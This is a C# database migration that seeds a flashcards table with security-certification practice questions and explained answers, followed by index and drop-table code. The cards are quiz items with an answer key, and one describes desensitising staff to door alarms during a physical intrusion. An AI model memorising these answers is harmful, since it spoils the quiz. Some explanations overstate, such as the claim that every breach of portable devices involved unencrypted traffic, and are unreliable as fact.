                values: new object[] { 332, "\r\n115. D. Transport Layer Security (TLS) provides a reliable method\r\nof encrypting web traffic. It supports mutual authentication and\r\nis considered secure. Although Secure Sockets Layer (SSL) can\r\nencrypt web traffic, TLS was created in 1999 as its successor.\r\nAlthough many network administrators still use the term SSL, in\r\nmost cases today what you are using is actually TLS, not the\r\noutdated SSL. PPTP and IPSec are protocols for establishing a\r\nVPN, not for encrypting web traffic.\r\n", 2, "\r\n115. Mia is a network administrator for a bank. She is responsible for secure communications\r\nwith her company’s customer website. Which of the following would be the best for her to\r\nimplement?\r\nA. SSL\r\nB. PPTP\r\nC. IPSec\r\nD. TLS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 333, "\r\n116. A. Smartcards can support modern cryptographic algorithms,\r\nmeaning that weak security due to a smartcard’s limitations on\r\nencryption is not a common issue. Smartcard readers and\r\nmaintenance do add additional expense, and user experiences\r\nare limited by the need to have the card in hand and insert it or\r\npresent it to a reader either during authentication or for entire\r\nsessions. Smartcards typically have a PIN or password, meaning\r\nthat they are used for multifactor, not single-factor,\r\nauthentication.\r\n", 2, "\r\n116. Which of the following is not a common challenge with smartcard-based authentication s\r\nystems?\r\nA. Weak security due to the limitations of the smartcard’s encryption support\r\nB. Added expense due to card readers, distribution, and software installation\r\nC. Weaker user experience due to the requirement to insert the card for every authentication\r\nD. Lack of security due to possession of the card being the only factor used\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 334, "\r\n117. D. Setting off an alarm so that staff become used to it being a\r\nfalse positive is a technique that penetration testers may use if\r\nthey can gain access to a facility. Once staff are used to alarms\r\ngoing off and ignore it, the penetration testers can enter areas\r\nthat are alarmed without a response occurring. Setting off the\r\nalarm as part of a test isn’t typical for penetration testers, and\r\ndisabling the alarm and waiting for the lack of an alarm to be\r\nreported is also more likely to be part of an internal test, not a\r\npenetration test. Asking staff members to open the door is not a\r\nmeans of making alarms less effective, and staff members who\r\nknow the door is alarmed are unlikely to do so.\r\n", 2, "\r\n117. Susan’s secure building is equipped with alarms that go off if specific doors are opened. As\r\npart of a penetration test, Susan wants to determine if the alarms are effective. What technique\r\nis used by penetration testers to make alarms less effective?\r\nA. Setting off the alarms as part of a preannounced test\r\nB. Disabling the alarms and then opening doors to see if staff report the opened doors\r\nC. Asking staff members to open the doors to see if they will set the alarm off\r\nD. Setting off the alarms repeatedly so that staff become used to hearing them go off\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 335, "\r\n118. C. The term “XaaS” refers to anything as a service, a broad\r\nreference to the huge number of options that exist for services\r\nvia third-party providers. The rest of the options for this\r\nquestion were made up for the question.\r\n", 2, "\r\n118. What term is used to describe the general concept of “anything as a service”?\r\nA. AaaS\r\nB. ATaaS\r\nC. XaaS\r\nD. ZaaS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 336, "\r\n119. D. Signage plays multiple roles in secure environments,\r\nincluding discouraging unwanted or unauthorized access,\r\nproviding safety warnings, and helping with evacuation routes\r\nand other navigation information as part of a physical safety\r\neffort.\r\n", 2, "\r\n119. What role does signage play in building security?\r\nA. It is a preventive control warning unauthorized individuals away from secured areas.\r\nB. It can help with safety by warning about dangerous areas, materials, or equipment.\r\nC. It can provide directions for evacuation and general navigation.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 325, "\r\n108. D. Bollards are large barriers that are often made of strong\r\nsubstances like concrete. They are effective in preventing a\r\nvehicle from being driven into a building. None of the other\r\nanswers match the purpose of a bollard.\r\n", 2, "\r\n108. Farès is responsible for security at his company. He has had bollards installed around the\r\nfront of the building. What is Farès trying to accomplish?\r\nA. Gated access for people entering the building\r\nB. Video monitoring around the building\r\nC. Protecting against EMI\r\nD. Preventing a vehicle from being driven into the building\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 311, "\r\n94. A. RFCs, or requests for comment, are how Internet protocols\r\nare defined and documented. Wikipedia is not the definitive\r\nresource, and the Internet Archive actively archives the Internet\r\nbut does not define protocols.\r\n", 2, "\r\n94. Greta wants to understand how a protocol works, including what values should be included\r\nin packets that use that protocol. Where is this data definitively defined and documented?\r\nA. An RFC\r\nB. Wikipedia\r\nC. The Internet Archive\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 310, "\r\n93. A. An advantage of compiling software is that you can perform\r\nstatic code analysis. That means Amanda can review the source\r\ncode for flaws and could even remediate flaws if they were\r\nfound. Both binaries and compiled code can be tested in a live\r\nenvironment (dynamic analysis), and checksums for both can be\r\nvalidated.\r\n", 2, "\r\n93. What additional security control can Amanda implement if she uses compiled software that\r\nshe cannot use if she only has software binaries?\r\nA. She can review the source code.\r\nB. She can test the application in a live environment.\r\nC. She can check the checksums provided by the vendor.\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 309, "\r\n92. D. The more vehicles utilize computers and have network\r\ncommunication capabilities, the more they will be vulnerable to\r\ncyberattacks. Options A, B, and C are all incorrect, as all of these\r\nare concerns rather than just one.\r\n", 2, "\r\n92. Emile is concerned about securing the computer systems in vehicles. Which of the following\r\nvehicle types has significant cybersecurity vulnerabilities?\r\nA. UAV\r\nB. Automobiles\r\nC. Airplanes\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 284, "\r\n67. A. The correct answer is to have a motion-activated camera\r\nthat records everyone who enters the server room. Motion\r\nrecognition is an important feature in this type of scenario,\r\nwhere cameras operate in a space where there is little physical\r\ntraffic and storage would be wasted by recording empty, unused\r\nspaces. Smartcards, deadbolts, and logging won’t detect theft.\r\n", 2, "\r\n67. You are responsible for server room security for your company. You are concerned about\r\nphysical theft of the computers. Which of the following would be best able to detect theft or\r\nattempted theft?\r\nA. Motion sensor–activated cameras\r\nB. Smartcard access to the server rooms\r\nC. Strong deadbolt locks for the server rooms\r\nD. Logging everyone who enters the server room\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 285, "\r\n68. C. A Domain Name System (DNS) sinkhole is a DNS server\r\nused to spoof DNS servers that would normally resolve an\r\nunwanted to malicious hostname. Traffic can be sent to a\r\nlegitimate system, causing warnings to appear on the user’s\r\nscreen, or simply sent to a null route or nonexistent system. An\r\nintrusion detection system (IDS) cannot stop traffic, roundrobin\r\nDNS is a way to spread DNS traffic, and a WAF is a web\r\napplication firewall, and nothing in this question indicates that\r\nthere is a web-specific issue.\r\n", 2, "\r\n68. Alexandra wants to prevent systems that are infected with malware from connecting to a\r\nbotnet controller that she knows the hostnames for. What type of solution can she implement\r\nto prevent the systems from reaching the controller?\r\nA. An IDS\r\nB. A round-robin DNS\r\nC. A DNS sinkhole\r\nD. A WAF\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 286, "\r\n69. C. Hot aisle/cold aisle is a layout design for server racks and\r\nother computing equipment in a datacenter. The goal of a hot\r\naisle/cold aisle configuration is to conserve energy and lower\r\ncooling costs by managing airflow. An infrared camera will\r\ndetect heat levels on the aisles. Although the rest of the options\r\nare potential issues for a datacenter, an infrared camera won’t\r\nhelp with them.\r\n", 2, "\r\n69. Hector is using infrared cameras to verify that servers in his datacenter are being properly\r\nracked. Which of the following datacenter elements is he concerned about?\r\nA. EMI blocking\r\nB. Humidity control\r\nC. Hot and cold aisles\r\nD. UPS failover\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 287, "\r\n70. D. A security guard is the most effective way to prevent\r\nunauthorized access to a building. Options A, B, and C are all\r\nincorrect. These are all good physical security measures, but\r\nthey are not the most effective ways to prevent entry into a\r\nbuilding.\r\n", 2, "\r\n70. Gerald is concerned about unauthorized people entering the company’s building. Which of\r\nthe following would be most effective in preventing this?\r\nA. Alarm systems\r\nB. Fencing\r\nC. Cameras\r\nD. Security guards\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 288, "\r\n71. B. Software-defined networking (SDN) makes the network very\r\nscalable. It is relatively easy to add on new resources or remove\r\nunneeded resources, and it helps with high availability efforts.\r\nSDN does not stop malware, detect intrusions, or prevent\r\nsession hijacking.\r\n", 2, "\r\n71. Which of the following is the most important benefit from implementing SDN?\r\nA. It will stop malware.\r\nB. It provides scalability.\r\nC. It will detect intrusions.\r\nD. It will prevent session hijacking.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 289, "\r\n72. A. The correct answer is to use an application container to\r\nisolate that application from the host operating system.\r\nApplication containers provide a virtualized environment in\r\nwhich to run an application. Moving to software-defined\r\nnetworking (SDN) is a very involved process and does not\r\nprovide an efficient solution. Running the application in a\r\nseparate VLAN will not separate the application from the host\r\noperating system; it might not solve the problem. Since this is a\r\nlegacy application, insisting on an updated version of the\r\napplication isn’t feasible.\r\n", 2, "\r\n72. Mark is an administrator for a health care company. He has to support an older, legacy application.\r\nHe is concerned that this legacy application might have vulnerabilities that would\r\naffect the rest of the network. What is the most efficient way to mitigate this?\r\nA. Use an application container.\r\nB. Implement SDN.\r\nC. Run the application on a separate VLAN.\r\nD. Insist on an updated version of the application.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 290, "\r\n73. D. Each of the options above is a potential risk when using\r\nthird-party libraries or SDKs. Organizations need to understand\r\nand assess the risks of third-party code, but it is a common\r\npractice to use third-party libraries. Identifying trustworthy and\r\nreliable sources and managing the versions and updates are\r\ncritical to using third-party components safely.\r\n", 2, "\r\n73. Charles is performing a security review of an internally developed web application. During\r\nhis review, he notes that the developers who wrote the application have made use of thirdparty\r\nlibraries. What risks should he note as part of his review?\r\nA. Code compiled with vulnerable third-party libraries will need to be recompiled with\r\npatched libraries.\r\nB. Libraries used via code repositories could become unavailable, breaking the application.\r\nC. Malicious code could be added without the developers knowing it.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 291, "\r\n74. B. A cloud access security broker (CASB) is used to monitor\r\ncloud activity and usage and to enforce security policies on users\r\nof cloud services.\r\n", 2, "\r\n74. Valerie is considering deploying a cloud access security broker. What sort of tool is she\r\nlooking at?\r\nA. A system that implements mandatory access control on cloud infrastructure\r\nB. A tool that sits between cloud users and applications to monitor activity and enforce\r\npolicies\r\nC. A tool that sits between cloud application providers and customers to enforce web application\r\nsecurity policies\r\nD. A system that implements discretionary access control on cloud infrastructure\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 292, "\r\n75. A. Microservice architectures build applications as a set of\r\nloosely coupled services that provide specific functions using\r\nlightweight protocols. It doesn’t specifically define the size of the\r\nsystems, but it is not a tightly coupled environment. Protocol\r\nchoice is often open standards-based, but the emphasis is on\r\nlightweight protocols. There is not a requirement that services\r\nbe in-house or third party exclusively.\r\n", 2, "\r\n75. Derek has been asked to implement his organization’s service-oriented architecture as a set of\r\nmicroservices. What does he need to implement?\r\nA. A set of loosely coupled services with specific purposes\r\nB. A set of services that run on very small systems\r\nC. A set of tightly coupled services with custom-designed protocols to ensure continuous\r\noperation\r\nD. A set of services using third-party applications in a connected network enabled with\r\nindustry standard protocols\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 293, "\r\n76. C. The correct answer is to implement IaC. Infrastructure as\r\ncode (IaC) is the process of managing and provisioning\r\ncomputer datacenters through machine-readable definition files,\r\nrather than physical hardware configuration or interactive\r\nconfiguration tools. Whether the datacenter(s) use physical\r\nmachines or virtual machines, this is an effective way to manage\r\nthe datacenters. Although datacenter managers may be needed,\r\nthat won’t necessarily provide consistent management across\r\nthe enterprise. Software-defined networking (SDN) will not fix\r\nthis problem, but it would help if she needed to configure and\r\nmanage her network based on usage and performance. Finally,\r\nthis issue is not just about provisioning; it is about management.\r\n", 2, "\r\n76. Abigail is responsible for datacenters in a large, multinational company. She has to support\r\nmultiple datacenters in diverse geographic regions. What would be the most effective way for\r\nher to manage these centers consistently across the enterprise?\r\nA. Hire datacenter managers for each center.\r\nB. Implement enterprise-wide SDN.\r\nC. Implement infrastructure as code (IaC).\r\nD. Automate provisioning and deprovisioning.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 294, "\r\n77. D. OAuth is a common authorization service used for cloud\r\nservices. It allows users to decide which websites or applications\r\nto entrust their information to without requiring them to give\r\nthem the user’s password. OpenID is frequently paired with\r\nOAuth as the authentication layer. Kerberos is more frequently\r\nused for on-site authentication, and SAML is Security Assertion\r\nMarkup Language.\r\n", 2, "\r\n77. Elizabeth wants to implement a cloud-based authorization system. Which of the following\r\nprotocols is she most likely to use for that purpose?\r\nA. OpenID\r\nB. Kerberos\r\nC. SAML\r\nD. OAuth\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 295, "\r\n78. C. In this scenario Greg should identify the use of the printers\r\nfor further attacks against the organization as the most critical\r\nrisk. Use as part of a distributed denial-of-service (DDoS) attack\r\ndoes not directly impact the organization in most cases,\r\nexhausting supplies would be an annoyance, and the risk of\r\nscanning documents from a remote location requires sensitive\r\ndocuments to be left in the MFPs. Greg should note that all of\r\nthese issues could be problems and move the MFPs to a\r\nprotected network so that third parties can’t access them.\r\n", 2, "\r\n78. Greg is assessing an organization and finds that they have numerous multifunction printers\r\n(MFPs) that are accessible from the public Internet. What is the most critical security issue he\r\nshould identify?\r\nA. Third parties could print to the printers, using up the supplies.\r\nB. The printers could be used as part of a DDoS attack.\r\nC. The printers may allow attackers to access other parts of the company network.\r\nD. The scanners may be accessed to allow attackers to scan documents that are left in them.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 296, "\r\n79. D. The systems that Keith has deployed are thin clients,\r\ncomputers that do not run their applications and storage from\r\ntheir local drives and instead rely on a remote server. Cloud and\r\nvirtualization implementations of this providing virtual desktops\r\nare called VDI, or Virtual Desktop Infrastructure, but do not\r\nnecessarily require a thin client, since they can work on a fully\r\ncapable computer (or thick client). Client-as-a-server is a madeup\r\nterm.\r\n", 2, "\r\n79. Keith has deployed computers to users in his company that load their resources from a\r\ncentral server environment rather than from their own hard drives. What term describes\r\nthis model?\r\nA. Thick clients\r\nB. Client-as-a-server\r\nC. Cloud desktops\r\nD. Thin clients\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 297, "\r\n80. B. This real-world example was found in 2020 when malicious\r\nPowerShell code was discovered that triple-encoded malicious\r\ntools. The initial package was downloaded as an image from\r\nimgur.com or similar sites and was concealed using\r\nsteganographic techniques. The code was also encrypted using\r\nRSA and encoded in Base64 both prior to encryption and again\r\nafter encryption. Although steganography is not incredibly\r\ncommon, Henry should suspect that a downloaded image may\r\nbe more than it appears.\r\n", 2, "\r\n80. Henry notices that a malware sample he is analyzing downloads a file from imgur.com and\r\nthen executes an attack using Mimikatz, a powerful Windows password account theft tool.\r\nWhen he analyzes the image, he cannot identify any recognizable code. What technique has\r\nmost likely been used in this scenario?\r\nA. The image is used as decryption key.\r\nB. The code is hidden in the image using steganography.\r\nC. The code is encoded as text in the image.\r\nD. The image is a control command from a malware command and control network.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 298, "\r\n81. A. Storing data in plain text will not help prevent data exposure\r\nand, in fact, is more likely to result in data exposure. Instead,\r\nMolly should encourage her developers to store and transmit\r\nsensitive data in an encrypted form. They should also leverage\r\nHTTPS for all authenticated pages, and potentially all pages.\r\nHashing passwords using salts is important for password\r\nsecurity, and ensuring that tokens are not exposed via sites like\r\nGitHub or other public code repositories is important for\r\napplication and data security.\r\n", 2, "\r\n81. Molly wants to advise her organization’s developers on secure coding techniques to avoid\r\ndata exposure. Which of the following is not a common technique used to prevent sensitive\r\ndata exposure?\r\nA. Store data in plain text.\r\nB. Require HTTPs for all authenticated pages.\r\nC. Ensure tokens are not disclosed in public source code.\r\nD. Hash passwords using a salt.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 299, "\r\n82. C. Using secure firmware, as well as using an RTOS with time\r\nand space partitioning, are both common methods to help\r\nensure RTOS security. Unlike traditional operating systems,\r\nreal-time operating systems are used in applications where they\r\nneed to deal with inputs immediately. That means that adding\r\nadditional load like firewalls and antimalware is not a typical\r\ncomponent in RTOS applications. For similar reasons, you’re\r\nunlikely to find a web browser on most devices running an\r\nRTOS.\r\n", 2, "\r\n82. Naomi wants to secure a real-time operating system (RTOS). Which of the following techniques\r\nis best suited to providing RTOS security?\r\nA. Disable the web browser.\r\nB. Install a host firewall.\r\nC. Use secure firmware.\r\nD. Install antimalware software.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 300, "\r\n83. B. In a code reuse attack, the attacker executes code that is\r\nmeant for some other purposes. In many cases this can be old\r\ncode that is no longer even used (dead code), even if that code is\r\nin a third-party library. A buffer overflow occurs when too much\r\ndata is sent to a buffer. For example, say a buffer is designed to\r\nhold 10 bytes, and it is sent 100 bytes, causing the additional\r\ndata to be put into unexpected memory locations. A denial-ofservice\r\n(DoS) attack is meant to make a service or system\r\nunavailable to legitimate users. Session hijacking involves taking\r\nover an existing authenticated session.\r\n", 2, "\r\n83. John is examining the logs for his company’s web applications. He discovers what he believes\r\nis a breach. After further investigation, it appears as if the attacker executed code from one of\r\nthe libraries the application uses, code that is no longer even used by the application. What\r\nbest describes this attack?\r\nA. Buffer overflow\r\nB. Code reuse attack\r\nC. DoS attack\r\nD. Session hijacking\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 301, "\r\n84. C. Zigbee is specifically designed for this type of usage.\r\nNarrowband radios are not typically in use for this type of\r\npurpose, and baseband radio requires very large antennas to use\r\nthe low-frequency spectrum. Cellular options require a carrier\r\nand are not well suited to direct peer-to-peer configurations.\r\n", 2, "\r\n84. Chris is designing an embedded system that needs to provide low-power, peer-to-peer communications.\r\nWhich of the following technologies is best suited to this purpose?\r\nA. Baseband radio\r\nB. Narrowband radio\r\nC. Zigbee\r\nD. Cellular\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 302, "\r\n85. B. Homomorphic encryption can perform computations on the\r\nciphertext without access to the private key that the ciphertext\r\nwas encrypted with. When the computations are completed, the\r\nresults are the same as if those computations had been\r\nperformed against the original plain text. Identity-preserving\r\nand replicable encryption were made up for this question.\r\n", 2, "\r\n85. What term is used to describe encryption that can permit computations to be conducted on\r\nciphertext, with the results matching what would have occurred if the same computations\r\nwere performed on the original plain text?\r\nA. Identity-preserving encryption\r\nB. Homomorphic encryption\r\nC. Replicable encryption\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 303, "\r\n86. A. Fingerprint reader systems are the most widely accepted\r\nbiometric systems in common use for entry access and other\r\npurposes today. Facial recognition systems are increasingly in\r\nuse and are also likely to be more accepted by user populations\r\nbased on their broad deployment in phones, but they are not\r\nlisted as an option. Both retina and iris scans are less likely to be\r\naccepted, whereas voice systems are both relatively uncommon\r\nand more disruptive for frequent usage.\r\n", 2, "\r\n86. Tony wants to implement a biometric system for entry access in his organization. Which of\r\nthe following systems is likely to be most accepted by members of his organization’s staff?\r\nA. Fingerprint\r\nB. Retina\r\nC. Iris\r\nD. Voice\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 304, "\r\n87. C. Tape backups are the most common solution for cold\r\nbackups off-site. Cloud backups to a cold repository are\r\nincreasingly popular options and may be faster for some\r\nretrieval scenarios, but they are not listed as options. Storage\r\narea network (SAN) and network-attached storage (NAS)\r\ndevices are not commonly used for cold backup and are instead\r\nused for online or nearline options. Disk backup could be used\r\nbut remains less common than tape for a true cold backup\r\nscenario.\r\n", 2, "\r\n87. Nathan wants to implement off-site cold backups. What backup technology is most\r\ncommonly used for this type of need?\r\nA. SAN\r\nB. Disk\r\nC. Tape\r\nD. NAS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 305, "\r\n88. B. Off-site storage has to balance availability and the ability to\r\nbe used in the event that a disaster or other event occurs. In this\r\ncase, Allan should look at a facility far enough away that a single\r\ndisaster cannot take both sites offline.\r\n", 2, "\r\n88. Allan is considering implementing off-site storage. When he does, his datacenter manager\r\noffers four solutions. Which of these solutions will best ensure resilience and why?\r\nA. Back up to a second datacenter in another building nearby, allowing reduced latency for\r\nbackups.\r\nB. Back up to an off-site location at least 90 miles away to ensure that a natural disaster\r\ndoes not destroy both copies.\r\nC. Back up to a second datacenter in another building nearby to ensure that the data will\r\nbe accessible if the power fails to the primary building.\r\nD. Back up to an off-site location at least 10 miles away to balance latency and resilience\r\ndue to natural disaster.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 306, "\r\n89. D. Embedded systems can bring a broad range of security\r\nimplications, many of which are driven by the limited\r\ncapabilities of the processors and hardware they are frequently\r\nbuilt with. Low-power consumption designs may lack\r\ncomputational power and thus have challenges implementing\r\nstrong cryptography, network connectivity, and other similar\r\nproblems. Patching embedded systems can be challenging both\r\nbecause of where they are deployed and because of a lack of\r\nconnectivity for them—in fact, in many environments, you may\r\nnot want the devices to be connected to your network. Since\r\nmany don’t have a screen, keyboard, or a network connection,\r\nauthentication is also a problem. Few embedded devices,\r\nhowever, need bulk storage, making the lack of bulk storage a\r\nproblem that typically isn’t a major concern.\r\n", 2, "\r\n89. Ben has been asked to explain the security implications for an embedded system that his\r\norganization is considering building and selling. Which of the following is not a typical concern\r\nfor embedded systems?\r\nA. Limited processor power\r\nB. An inability to patch\r\nC. Lack of authentication capabilities\r\nD. Lack of bulk storage\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 307, "\r\n90. B. System on a chip (SoC) devices are complete self-contained\r\nsystems on a single chip. Therefore, having their own unique\r\ncryptographic keys is the best way to implement authentication\r\nand security. Option A is incorrect. A system on a chip is selfcontained,\r\nso a Trusted Platform Module (TPM) would not be an\r\nappropriate solution. Option C is incorrect. A self-encrypting\r\ndrive (SED) is not relevant to system on a chip, since that system\r\ndoes not have a “drive.” Option D is incorrect. Many SoC\r\ntechnologies don’t use a BIOS.\r\n", 2, "\r\n90. You are concerned about the security of new devices your company has implemented. Some\r\nof these devices use SoC technology. What would be the best security measure you could take\r\nfor these?\r\nA. Using a TPM\r\nB. Ensuring each has its own cryptographic key\r\nC. Using SED\r\nD. Using BIOS protection\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 308, "\r\n91. A. Such systems need to have all communications encrypted.\r\nAs of the current date, breaches of portable network devices\r\nhave all involved unencrypted communications. Option B is\r\nincorrect. Full-disk encryption (FDE) may or may not even be\r\nappropriate for such devices. Many don’t have a disk to encrypt.\r\nOption C is incorrect. It may not be possible to install\r\nantimalware on many such devices. Option D is incorrect. Fuzz\r\ntesting is used for applications.\r\n", 2, "\r\n91. Vincent works for a company that manufactures portable medical devices, such as insulin\r\npumps. He is concerned about ensuring these devices are secure. Which of the following is\r\nthe most important step for him to take?\r\nA. Ensure all communications with the device are encrypted.\r\nB. Ensure the devices have FDE.\r\nC. Ensure the devices have individual antimalware.\r\nD. Ensure the devices have been fuzz-tested.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 338, "\r\n121. A. Windows calls the point that it saves to return to a known\r\ngood configuration a system restore point. Matt should set one\r\nprior to installing new software or patching if he is worried\r\nabout what might occur. The rest of the options are not\r\nWindows terms.\r\n", 2, "\r\n121. Matt is patching a Windows system and wants to have the ability to revert to a last known\r\ngood configuration. What should he set?\r\nA. A system restore point\r\nB. A reversion marker\r\nC. A nonpersistent patch point\r\nD. A live boot marker\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 902, "\r\n127. D. Privacy notices are frequently provided as part of license or\r\ncontractual terms, as well as in website usage agreements.", 5, "\r\n127. Where are privacy notices frequently found?\r\nA. The terms of an agreement for customers\r\nB. A click-through license agreement\r\nC. A website usage agreement\r\nD. All of the above", "" });

            migrationBuilder.CreateIndex(
                name: "IX_Categories_SubjectId",
                table: "Categories",
                column: "SubjectId");

            migrationBuilder.CreateIndex(
                name: "IX_Flashcards_CategoryId",
                table: "Flashcards",
                column: "CategoryId");

            migrationBuilder.CreateIndex(
                name: "IX_Questions_TestId",
                table: "Questions",
                column: "TestId");

            migrationBuilder.CreateIndex(
                name: "IX_Tests_SubjectId",
                table: "Tests",
                column: "SubjectId");
        }

        protected override void Down(MigrationBuilder migrationBuilder)
        {
            migrationBuilder.DropTable(
                name: "Flashcards");

            migrationBuilder.DropTable(
                name: "Questions");

            migrationBuilder.DropTable(
                name: "Categories");

            migrationBuilder.DropTable(
                name: "Tests");

            migrationBuilder.DropTable(
                name: "Subjects");
        }
    }
}
